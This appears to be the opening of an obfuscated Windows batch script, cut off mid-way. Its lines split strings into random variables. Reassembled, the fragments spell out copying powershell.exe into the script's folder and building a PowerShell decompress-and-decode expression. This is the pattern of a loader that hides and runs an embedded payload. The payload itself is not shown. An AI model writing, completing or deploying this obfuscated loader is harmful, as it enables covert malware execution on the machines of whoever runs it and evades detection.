@echo off
set "WwkdxxGYYV=he"
set "iRDSTriFoR=py"
set "eIEkwRZqUC=em"
set "etWYfBcQNj=in"
set "IwSMxGJlYJ=po"
set "eOsEhoEQmg=nd"
set "IaZHjLAFMd=do"
set "UMYoXzulOd=ow"
set "FAYcXnLOnp=32"
set "dnOlUnAZXf=\v"
set "hyDfsyTtox=Wi"
set "lVbeGiAtQg=we"
set "wJxrdQqVQm=:\"
set "iAbZSBEfKp=\W"
set "ouxddIOlOf=we"
set "TzLwBNyjhR=1."
set "UyxSWPuujX=he"
set "aZtGGsseoB=rS"
set "bnObJFIeSj=s\"
set "OfjTZAqdOU=0\"
set "cPmTcappSs= /"
set "oAOuMXeVmt=rs"
set "COYENRktFF=xe"
set "lzIJruAohT=st"
set "jHajaIqTkP=Sy"
set "zObUjVcEsu=co"
set "hAIqSMKWmB=ll"
set "mTGEymDaXv=Po"
set "oYfWIQhCxq=y "
set "IMbSKEHEsU=ws"
set "dnlyCtIfPq=ll"
set "LfoIGhHxaA=.e"
set "eljkIdapGe= C"
set "NxylgOujXX= %~dp0"
set "uktveeURTj=cd"
set "lMRJbOPDhU=yLgu"
set "tEyKsViFfK=('da"
set "XxjnoqvkWC=]::C"
set "GmTdUbDSda=[]] "
set "MjkQggKVgY=YFva"
set "SYqizHWkJG=);$E"
set "lrrXkKLmPs= [st"
set "ssQwrgCQti= New"
set "PcvIZMGUfX=ress"
set "rfmpPwpQva=ct S"
set "UlUYGjnSNt=ck($"
set "JBUkjzKBSy= [Sy"
set "OlKLyvMjPx=($yL"
